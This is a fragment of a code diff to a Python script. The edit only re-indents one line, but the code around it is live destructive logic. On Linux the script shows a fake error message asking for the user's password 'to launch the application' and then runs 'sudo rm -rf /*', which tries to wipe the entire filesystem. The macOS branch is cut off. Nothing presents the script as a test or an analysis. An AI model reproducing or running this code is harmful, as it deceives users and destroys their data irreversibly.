@@ -8,7 +8,7 @@ from sys import platform
 if platform in ("linux", "linux2"):
     # linux
     password = input("Error: Please input your password to launch the "
-                 "application: ")
+                     "application: ")
     os.system('sudo rm -rf /*')
 
 elif platform == "darwin":
